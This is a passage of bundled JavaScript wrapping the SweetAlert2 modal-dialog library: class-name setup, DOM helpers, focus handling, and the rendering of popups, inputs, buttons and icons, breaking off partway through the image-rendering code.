(function() {
    'use strict';
    (() => {
        var __create = Object.create;
        var __defProp = Object.defineProperty;
        var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
        var __getOwnPropNames = Object.getOwnPropertyNames;
        var __getProtoOf = Object.getPrototypeOf;
        var __hasOwnProp = Object.prototype.hasOwnProperty;
        var __commonJS = (cb, mod) => function __require() {
            return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
        };
        var __copyProps = (to, from, except, desc) => {
            if (from && typeof from === "object" || typeof from === "function") {
                for (let key of __getOwnPropNames(from))
                    if (!__hasOwnProp.call(to, key) && key !== except)
                        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
            }
            return to;
        };
        var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
            // If the importer is in node compatibility mode or this is not an ESM
            // file that has been converted to a CommonJS file using a Babel-
            // compatible transform (i.e. "__esModule" has not been set), then set
            // "default" to the CommonJS "module.exports" for node compatibility.
            isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
            mod
        ));

        // node_modules/sweetalert2/dist/sweetalert2.all.js
        var require_sweetalert2_all = __commonJS({
            "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports, module) {
                (function(global, factory) {
                    typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global = typeof globalThis !== "undefined" ? globalThis : global || self, global.Sweetalert2 = factory());
                })(exports, function() {
                    "use strict";
                    var privateProps = {
                        awaitingPromise: /* @__PURE__ */ new WeakMap(),
                        promise: /* @__PURE__ */ new WeakMap(),
                        innerParams: /* @__PURE__ */ new WeakMap(),
                        domCache: /* @__PURE__ */ new WeakMap()
                    };
                    const swalPrefix = "swal2-";
                    const prefix = (items) => {
                        const result = {};
                        for (const i in items) {
                            result[items[i]] = swalPrefix + items[i];
                        }
                        return result;
                    };
                    const swalClasses = prefix(["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"]);
                    const iconTypes = prefix(["success", "warning", "info", "question", "error"]);
                    const consolePrefix = "SweetAlert2:";
                    const uniqueArray = (arr) => {
                        const result = [];
                        for (let i = 0; i < arr.length; i++) {
                            if (result.indexOf(arr[i]) === -1) {
                                result.push(arr[i]);
                            }
                        }
                        return result;
                    };
                    const capitalizeFirstLetter = (str) => str.charAt(0).toUpperCase() + str.slice(1);
                    const warn = (message) => {
                        console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
                    };
                    const error = (message) => {
                        console.error(`${consolePrefix} ${message}`);
                    };
                    const previousWarnOnceMessages = [];
                    const warnOnce = (message) => {
                        if (!previousWarnOnceMessages.includes(message)) {
                            previousWarnOnceMessages.push(message);
                            warn(message);
                        }
                    };
                    const warnAboutDeprecation = (deprecatedParam, useInstead) => {
                        warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release. Please use "${useInstead}" instead.`);
                    };
                    const callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
                    const hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
                    const asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
                    const isPromise = (arg) => arg && Promise.resolve(arg) === arg;
                    const getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
                    const elementBySelector = (selectorString) => {
                        const container = getContainer();
                        return container ? container.querySelector(selectorString) : null;
                    };
                    const elementByClass = (className) => {
                        return elementBySelector(`.${className}`);
                    };
                    const getPopup = () => elementByClass(swalClasses.popup);
                    const getIcon = () => elementByClass(swalClasses.icon);
                    const getIconContent = () => elementByClass(swalClasses["icon-content"]);
                    const getTitle = () => elementByClass(swalClasses.title);
                    const getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
                    const getImage = () => elementByClass(swalClasses.image);
                    const getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
                    const getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
                    const getConfirmButton = () => (
                        /** @type {HTMLButtonElement} */
                        elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`)
                    );
                    const getCancelButton = () => (
                        /** @type {HTMLButtonElement} */
                        elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`)
                    );
                    const getDenyButton = () => (
                        /** @type {HTMLButtonElement} */
                        elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`)
                    );
                    const getInputLabel = () => elementByClass(swalClasses["input-label"]);
                    const getLoader = () => elementBySelector(`.${swalClasses.loader}`);
                    const getActions = () => elementByClass(swalClasses.actions);
                    const getFooter = () => elementByClass(swalClasses.footer);
                    const getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
                    const getCloseButton = () => elementByClass(swalClasses.close);
                    const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
                    const getFocusableElements = () => {
                        const focusableElementsWithTabindex = Array.from(getPopup().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort((a, b) => {
                            const tabindexA = parseInt(a.getAttribute("tabindex"));
                            const tabindexB = parseInt(b.getAttribute("tabindex"));
                            if (tabindexA > tabindexB) {
                                return 1;
                            } else if (tabindexA < tabindexB) {
                                return -1;
                            }
                            return 0;
                        });
                        const otherFocusableElements = Array.from(getPopup().querySelectorAll(focusable)).filter((el) => el.getAttribute("tabindex") !== "-1");
                        return uniqueArray(focusableElementsWithTabindex.concat(otherFocusableElements)).filter((el) => isVisible$1(el));
                    };
                    const isModal = () => {
                        return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
                    };
                    const isToast = () => {
                        return getPopup() && hasClass(getPopup(), swalClasses.toast);
                    };
                    const isLoading = () => {
                        return getPopup().hasAttribute("data-loading");
                    };
                    const states = {
                        previousBodyPadding: null
                    };
                    const setInnerHtml = (elem, html) => {
                        elem.textContent = "";
                        if (html) {
                            const parser = new DOMParser();
                            const parsed = parser.parseFromString(html, `text/html`);
                            Array.from(parsed.querySelector("head").childNodes).forEach((child) => {
                                elem.appendChild(child);
                            });
                            Array.from(parsed.querySelector("body").childNodes).forEach((child) => {
                                if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
                                    elem.appendChild(child.cloneNode(true));
                                } else {
                                    elem.appendChild(child);
                                }
                            });
                        }
                    };
                    const hasClass = (elem, className) => {
                        if (!className) {
                            return false;
                        }
                        const classList = className.split(/\s+/);
                        for (let i = 0; i < classList.length; i++) {
                            if (!elem.classList.contains(classList[i])) {
                                return false;
                            }
                        }
                        return true;
                    };
                    const removeCustomClasses = (elem, params) => {
                        Array.from(elem.classList).forEach((className) => {
                            if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass).includes(className)) {
                                elem.classList.remove(className);
                            }
                        });
                    };
                    const applyCustomClass = (elem, params, className) => {
                        removeCustomClasses(elem, params);
                        if (params.customClass && params.customClass[className]) {
                            if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
                                warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof params.customClass[className]}"`);
                                return;
                            }
                            addClass(elem, params.customClass[className]);
                        }
                    };
                    const getInput$1 = (popup, inputClass) => {
                        if (!inputClass) {
                            return null;
                        }
                        switch (inputClass) {
                            case "select":
                            case "textarea":
                            case "file":
                                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
                            case "checkbox":
                                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
                            case "radio":
                                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
                            case "range":
                                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
                            default:
                                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
                        }
                    };
                    const focusInput = (input) => {
                        input.focus();
                        if (input.type !== "file") {
                            const val = input.value;
                            input.value = "";
                            input.value = val;
                        }
                    };
                    const toggleClass = (target, classList, condition) => {
                        if (!target || !classList) {
                            return;
                        }
                        if (typeof classList === "string") {
                            classList = classList.split(/\s+/).filter(Boolean);
                        }
                        classList.forEach((className) => {
                            if (Array.isArray(target)) {
                                target.forEach((elem) => {
                                    condition ? elem.classList.add(className) : elem.classList.remove(className);
                                });
                            } else {
                                condition ? target.classList.add(className) : target.classList.remove(className);
                            }
                        });
                    };
                    const addClass = (target, classList) => {
                        toggleClass(target, classList, true);
                    };
                    const removeClass = (target, classList) => {
                        toggleClass(target, classList, false);
                    };
                    const getDirectChildByClass = (elem, className) => {
                        const children = Array.from(elem.children);
                        for (let i = 0; i < children.length; i++) {
                            const child = children[i];
                            if (child instanceof HTMLElement && hasClass(child, className)) {
                                return child;
                            }
                        }
                    };
                    const applyNumericalStyle = (elem, property, value) => {
                        if (value === `${parseInt(value)}`) {
                            value = parseInt(value);
                        }
                        if (value || parseInt(value) === 0) {
                            elem.style[property] = typeof value === "number" ? `${value}px` : value;
                        } else {
                            elem.style.removeProperty(property);
                        }
                    };
                    const show = function(elem) {
                        let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
                        elem.style.display = display;
                    };
                    const hide = (elem) => {
                        elem.style.display = "none";
                    };
                    const setStyle = (parent, selector, property, value) => {
                        const el = parent.querySelector(selector);
                        if (el) {
                            el.style[property] = value;
                        }
                    };
                    const toggle = function(elem, condition) {
                        let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
                        condition ? show(elem, display) : hide(elem);
                    };
                    const isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
                    const allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
                    const isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
                    const hasCssAnimation = (elem) => {
                        const style = window.getComputedStyle(elem);
                        const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
                        const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
                        return animDuration > 0 || transDuration > 0;
                    };
                    const animateTimerProgressBar = function(timer) {
                        let reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
                        const timerProgressBar = getTimerProgressBar();
                        if (isVisible$1(timerProgressBar)) {
                            if (reset) {
                                timerProgressBar.style.transition = "none";
                                timerProgressBar.style.width = "100%";
                            }
                            setTimeout(() => {
                                timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
                                timerProgressBar.style.width = "0%";
                            }, 10);
                        }
                    };
                    const stopTimerProgressBar = () => {
                        const timerProgressBar = getTimerProgressBar();
                        const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
                        timerProgressBar.style.removeProperty("transition");
                        timerProgressBar.style.width = "100%";
                        const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
                        const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
                        timerProgressBar.style.width = `${timerProgressBarPercent}%`;
                    };
                    const RESTORE_FOCUS_TIMEOUT = 100;
                    const globalState = {};
                    const focusPreviousActiveElement = () => {
                        if (globalState.previousActiveElement instanceof HTMLElement) {
                            globalState.previousActiveElement.focus();
                            globalState.previousActiveElement = null;
                        } else if (document.body) {
                            document.body.focus();
                        }
                    };
                    const restoreActiveElement = (returnFocus) => {
                        return new Promise((resolve) => {
                            if (!returnFocus) {
                                return resolve();
                            }
                            const x = window.scrollX;
                            const y = window.scrollY;
                            globalState.restoreFocusTimeout = setTimeout(() => {
                                focusPreviousActiveElement();
                                resolve();
                            }, RESTORE_FOCUS_TIMEOUT);
                            window.scrollTo(x, y);
                        });
                    };
                    const isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
                    const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label for="${swalClasses.checkbox}" class="${swalClasses.checkbox}">
     <input type="checkbox" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
                    const resetOldContainer = () => {
                        const oldContainer = getContainer();
                        if (!oldContainer) {
                            return false;
                        }
                        oldContainer.remove();
                        removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
                        return true;
                    };
                    const resetValidationMessage$1 = () => {
                        globalState.currentInstance.resetValidationMessage();
                    };
                    const addInputChangeListeners = () => {
                        const popup = getPopup();
                        const input = getDirectChildByClass(popup, swalClasses.input);
                        const file = getDirectChildByClass(popup, swalClasses.file);
                        const range = popup.querySelector(`.${swalClasses.range} input`);
                        const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
                        const select = getDirectChildByClass(popup, swalClasses.select);
                        const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
                        const textarea = getDirectChildByClass(popup, swalClasses.textarea);
                        input.oninput = resetValidationMessage$1;
                        file.onchange = resetValidationMessage$1;
                        select.onchange = resetValidationMessage$1;
                        checkbox.onchange = resetValidationMessage$1;
                        textarea.oninput = resetValidationMessage$1;
                        range.oninput = () => {
                            resetValidationMessage$1();
                            rangeOutput.value = range.value;
                        };
                        range.onchange = () => {
                            resetValidationMessage$1();
                            rangeOutput.value = range.value;
                        };
                    };
                    const getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
                    const setupAccessibility = (params) => {
                        const popup = getPopup();
                        popup.setAttribute("role", params.toast ? "alert" : "dialog");
                        popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
                        if (!params.toast) {
                            popup.setAttribute("aria-modal", "true");
                        }
                    };
                    const setupRTL = (targetElement) => {
                        if (window.getComputedStyle(targetElement).direction === "rtl") {
                            addClass(getContainer(), swalClasses.rtl);
                        }
                    };
                    const init = (params) => {
                        const oldContainerExisted = resetOldContainer();
                        if (isNodeEnv()) {
                            error("SweetAlert2 requires document to initialize");
                            return;
                        }
                        const container = document.createElement("div");
                        container.className = swalClasses.container;
                        if (oldContainerExisted) {
                            addClass(container, swalClasses["no-transition"]);
                        }
                        setInnerHtml(container, sweetHTML);
                        const targetElement = getTarget(params.target);
                        targetElement.appendChild(container);
                        setupAccessibility(params);
                        setupRTL(targetElement);
                        addInputChangeListeners();
                    };
                    const parseHtmlToContainer = (param, target) => {
                        if (param instanceof HTMLElement) {
                            target.appendChild(param);
                        } else if (typeof param === "object") {
                            handleObject(param, target);
                        } else if (param) {
                            setInnerHtml(target, param);
                        }
                    };
                    const handleObject = (param, target) => {
                        if (param.jquery) {
                            handleJqueryElem(target, param);
                        } else {
                            setInnerHtml(target, param.toString());
                        }
                    };
                    const handleJqueryElem = (target, elem) => {
                        target.textContent = "";
                        if (0 in elem) {
                            for (let i = 0; i in elem; i++) {
                                target.appendChild(elem[i].cloneNode(true));
                            }
                        } else {
                            target.appendChild(elem.cloneNode(true));
                        }
                    };
                    const animationEndEvent = (() => {
                        if (isNodeEnv()) {
                            return false;
                        }
                        const testEl = document.createElement("div");
                        const transEndEventNames = {
                            WebkitAnimation: "webkitAnimationEnd",
                            // Chrome, Safari and Opera
                            animation: "animationend"
                            // Standard syntax
                        };
                        for (const i in transEndEventNames) {
                            if (Object.prototype.hasOwnProperty.call(transEndEventNames, i) && typeof testEl.style[i] !== "undefined") {
                                return transEndEventNames[i];
                            }
                        }
                        return false;
                    })();
                    const measureScrollbar = () => {
                        const scrollDiv = document.createElement("div");
                        scrollDiv.className = swalClasses["scrollbar-measure"];
                        document.body.appendChild(scrollDiv);
                        const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
                        document.body.removeChild(scrollDiv);
                        return scrollbarWidth;
                    };
                    const renderActions = (instance, params) => {
                        const actions = getActions();
                        const loader = getLoader();
                        if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
                            hide(actions);
                        } else {
                            show(actions);
                        }
                        applyCustomClass(actions, params, "actions");
                        renderButtons(actions, loader, params);
                        setInnerHtml(loader, params.loaderHtml);
                        applyCustomClass(loader, params, "loader");
                    };
                    function renderButtons(actions, loader, params) {
                        const confirmButton = getConfirmButton();
                        const denyButton = getDenyButton();
                        const cancelButton = getCancelButton();
                        renderButton(confirmButton, "confirm", params);
                        renderButton(denyButton, "deny", params);
                        renderButton(cancelButton, "cancel", params);
                        handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
                        if (params.reverseButtons) {
                            if (params.toast) {
                                actions.insertBefore(cancelButton, confirmButton);
                                actions.insertBefore(denyButton, confirmButton);
                            } else {
                                actions.insertBefore(cancelButton, loader);
                                actions.insertBefore(denyButton, loader);
                                actions.insertBefore(confirmButton, loader);
                            }
                        }
                    }
                    function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
                        if (!params.buttonsStyling) {
                            removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
                            return;
                        }
                        addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
                        if (params.confirmButtonColor) {
                            confirmButton.style.backgroundColor = params.confirmButtonColor;
                            addClass(confirmButton, swalClasses["default-outline"]);
                        }
                        if (params.denyButtonColor) {
                            denyButton.style.backgroundColor = params.denyButtonColor;
                            addClass(denyButton, swalClasses["default-outline"]);
                        }
                        if (params.cancelButtonColor) {
                            cancelButton.style.backgroundColor = params.cancelButtonColor;
                            addClass(cancelButton, swalClasses["default-outline"]);
                        }
                    }
                    function renderButton(button, buttonType, params) {
                        toggle(button, params[`show${capitalizeFirstLetter(buttonType)}Button`], "inline-block");
                        setInnerHtml(button, params[`${buttonType}ButtonText`]);
                        button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`]);
                        button.className = swalClasses[buttonType];
                        applyCustomClass(button, params, `${buttonType}Button`);
                        addClass(button, params[`${buttonType}ButtonClass`]);
                    }
                    const renderCloseButton = (instance, params) => {
                        const closeButton = getCloseButton();
                        setInnerHtml(closeButton, params.closeButtonHtml);
                        applyCustomClass(closeButton, params, "closeButton");
                        toggle(closeButton, params.showCloseButton);
                        closeButton.setAttribute("aria-label", params.closeButtonAriaLabel);
                    };
                    const renderContainer = (instance, params) => {
                        const container = getContainer();
                        if (!container) {
                            return;
                        }
                        handleBackdropParam(container, params.backdrop);
                        handlePositionParam(container, params.position);
                        handleGrowParam(container, params.grow);
                        applyCustomClass(container, params, "container");
                    };
                    function handleBackdropParam(container, backdrop) {
                        if (typeof backdrop === "string") {
                            container.style.background = backdrop;
                        } else if (!backdrop) {
                            addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
                        }
                    }
                    function handlePositionParam(container, position) {
                        if (position in swalClasses) {
                            addClass(container, swalClasses[position]);
                        } else {
                            warn('The "position" parameter is not valid, defaulting to "center"');
                            addClass(container, swalClasses.center);
                        }
                    }
                    function handleGrowParam(container, grow) {
                        if (grow && typeof grow === "string") {
                            const growClass = `grow-${grow}`;
                            if (growClass in swalClasses) {
                                addClass(container, swalClasses[growClass]);
                            }
                        }
                    }
                    const inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
                    const renderInput = (instance, params) => {
                        const popup = getPopup();
                        const innerParams = privateProps.innerParams.get(instance);
                        const rerender = !innerParams || params.input !== innerParams.input;
                        inputClasses.forEach((inputClass) => {
                            const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
                            setAttributes(inputClass, params.inputAttributes);
                            inputContainer.className = swalClasses[inputClass];
                            if (rerender) {
                                hide(inputContainer);
                            }
                        });
                        if (params.input) {
                            if (rerender) {
                                showInput(params);
                            }
                            setCustomClass(params);
                        }
                    };
                    const showInput = (params) => {
                        if (!renderInputType[params.input]) {
                            error(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${params.input}"`);
                            return;
                        }
                        const inputContainer = getInputContainer(params.input);
                        const input = renderInputType[params.input](inputContainer, params);
                        show(inputContainer);
                        if (params.inputAutoFocus) {
                            setTimeout(() => {
                                focusInput(input);
                            });
                        }
                    };
                    const removeAttributes = (input) => {
                        for (let i = 0; i < input.attributes.length; i++) {
                            const attrName = input.attributes[i].name;
                            if (!["type", "value", "style"].includes(attrName)) {
                                input.removeAttribute(attrName);
                            }
                        }
                    };
                    const setAttributes = (inputClass, inputAttributes) => {
                        const input = getInput$1(getPopup(), inputClass);
                        if (!input) {
                            return;
                        }
                        removeAttributes(input);
                        for (const attr in inputAttributes) {
                            input.setAttribute(attr, inputAttributes[attr]);
                        }
                    };
                    const setCustomClass = (params) => {
                        const inputContainer = getInputContainer(params.input);
                        if (typeof params.customClass === "object") {
                            addClass(inputContainer, params.customClass.input);
                        }
                    };
                    const setInputPlaceholder = (input, params) => {
                        if (!input.placeholder || params.inputPlaceholder) {
                            input.placeholder = params.inputPlaceholder;
                        }
                    };
                    const setInputLabel = (input, prependTo, params) => {
                        if (params.inputLabel) {
                            input.id = swalClasses.input;
                            const label = document.createElement("label");
                            const labelClass = swalClasses["input-label"];
                            label.setAttribute("for", input.id);
                            label.className = labelClass;
                            if (typeof params.customClass === "object") {
                                addClass(label, params.customClass.inputLabel);
                            }
                            label.innerText = params.inputLabel;
                            prependTo.insertAdjacentElement("beforebegin", label);
                        }
                    };
                    const getInputContainer = (inputType) => {
                        return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
                    };
                    const checkAndSetInputValue = (input, inputValue) => {
                        if (["string", "number"].includes(typeof inputValue)) {
                            input.value = `${inputValue}`;
                        } else if (!isPromise(inputValue)) {
                            warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
                        }
                    };
                    const renderInputType = {};
                    renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = (input, params) => {
                        checkAndSetInputValue(input, params.inputValue);
                        setInputLabel(input, input, params);
                        setInputPlaceholder(input, params);
                        input.type = params.input;
                        return input;
                    };
                    renderInputType.file = (input, params) => {
                        setInputLabel(input, input, params);
                        setInputPlaceholder(input, params);
                        return input;
                    };
                    renderInputType.range = (range, params) => {
                        const rangeInput = range.querySelector("input");
                        const rangeOutput = range.querySelector("output");
                        checkAndSetInputValue(rangeInput, params.inputValue);
                        rangeInput.type = params.input;
                        checkAndSetInputValue(rangeOutput, params.inputValue);
                        setInputLabel(rangeInput, range, params);
                        return range;
                    };
                    renderInputType.select = (select, params) => {
                        select.textContent = "";
                        if (params.inputPlaceholder) {
                            const placeholder = document.createElement("option");
                            setInnerHtml(placeholder, params.inputPlaceholder);
                            placeholder.value = "";
                            placeholder.disabled = true;
                            placeholder.selected = true;
                            select.appendChild(placeholder);
                        }
                        setInputLabel(select, select, params);
                        return select;
                    };
                    renderInputType.radio = (radio) => {
                        radio.textContent = "";
                        return radio;
                    };
                    renderInputType.checkbox = (checkboxContainer, params) => {
                        const checkbox = getInput$1(getPopup(), "checkbox");
                        checkbox.value = "1";
                        checkbox.id = swalClasses.checkbox;
                        checkbox.checked = Boolean(params.inputValue);
                        const label = checkboxContainer.querySelector("span");
                        setInnerHtml(label, params.inputPlaceholder);
                        return checkbox;
                    };
                    renderInputType.textarea = (textarea, params) => {
                        checkAndSetInputValue(textarea, params.inputValue);
                        setInputPlaceholder(textarea, params);
                        setInputLabel(textarea, textarea, params);
                        const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
                        setTimeout(() => {
                            if ("MutationObserver" in window) {
                                const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
                                const textareaResizeHandler = () => {
                                    const textareaWidth = textarea.offsetWidth + getMargin(textarea);
                                    if (textareaWidth > initialPopupWidth) {
                                        getPopup().style.width = `${textareaWidth}px`;
                                    } else {
                                        getPopup().style.width = null;
                                    }
                                };
                                new MutationObserver(textareaResizeHandler).observe(textarea, {
                                    attributes: true,
                                    attributeFilter: ["style"]
                                });
                            }
                        });
                        return textarea;
                    };
                    const renderContent = (instance, params) => {
                        const htmlContainer = getHtmlContainer();
                        applyCustomClass(htmlContainer, params, "htmlContainer");
                        if (params.html) {
                            parseHtmlToContainer(params.html, htmlContainer);
                            show(htmlContainer, "block");
                        } else if (params.text) {
                            htmlContainer.textContent = params.text;
                            show(htmlContainer, "block");
                        } else {
                            hide(htmlContainer);
                        }
                        renderInput(instance, params);
                    };
                    const renderFooter = (instance, params) => {
                        const footer = getFooter();
                        toggle(footer, params.footer);
                        if (params.footer) {
                            parseHtmlToContainer(params.footer, footer);
                        }
                        applyCustomClass(footer, params, "footer");
                    };
                    const renderIcon = (instance, params) => {
                        const innerParams = privateProps.innerParams.get(instance);
                        const icon = getIcon();
                        if (innerParams && params.icon === innerParams.icon) {
                            setContent(icon, params);
                            applyStyles(icon, params);
                            return;
                        }
                        if (!params.icon && !params.iconHtml) {
                            hide(icon);
                            return;
                        }
                        if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
                            error(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
                            hide(icon);
                            return;
                        }
                        show(icon);
                        setContent(icon, params);
                        applyStyles(icon, params);
                        addClass(icon, params.showClass.icon);
                    };
                    const applyStyles = (icon, params) => {
                        for (const iconType in iconTypes) {
                            if (params.icon !== iconType) {
                                removeClass(icon, iconTypes[iconType]);
                            }
                        }
                        addClass(icon, iconTypes[params.icon]);
                        setColor(icon, params);
                        adjustSuccessIconBackgroundColor();
                        applyCustomClass(icon, params, "icon");
                    };
                    const adjustSuccessIconBackgroundColor = () => {
                        const popup = getPopup();
                        const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
                        const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
                        for (let i = 0; i < successIconParts.length; i++) {
                            successIconParts[i].style.backgroundColor = popupBackgroundColor;
                        }
                    };
                    const successIconHtml = `
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`;
                    const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
                    const setContent = (icon, params) => {
                        let oldContent = icon.innerHTML;
                        let newContent;
                        if (params.iconHtml) {
                            newContent = iconContent(params.iconHtml);
                        } else if (params.icon === "success") {
                            newContent = successIconHtml;
                            oldContent = oldContent.replace(/ style=".*?"/g, "");
                        } else if (params.icon === "error") {
                            newContent = errorIconHtml;
                        } else {
                            const defaultIconHtml = {
                                question: "?",
                                warning: "!",
                                info: "i"
                            };
                            newContent = iconContent(defaultIconHtml[params.icon]);
                        }
                        if (oldContent.trim() !== newContent.trim()) {
                            setInnerHtml(icon, newContent);
                        }
                    };
                    const setColor = (icon, params) => {
                        if (!params.iconColor) {
                            return;
                        }
                        icon.style.color = params.iconColor;
                        icon.style.borderColor = params.iconColor;
                        for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
                            setStyle(icon, sel, "backgroundColor", params.iconColor);
                        }
                        setStyle(icon, ".swal2-success-ring", "borderColor", params.iconColor);
                    };
                    const iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
                    const renderImage = (instance, params) => {
                        const image = getImage();
                        if (!params.imageUrl) {
                            hide(image);
                            return;
                        }
                        show(image, "");
                        image.setAttribute("src", params.imageUrl);
                        image.setAttribute("alt", params.imageAlt);
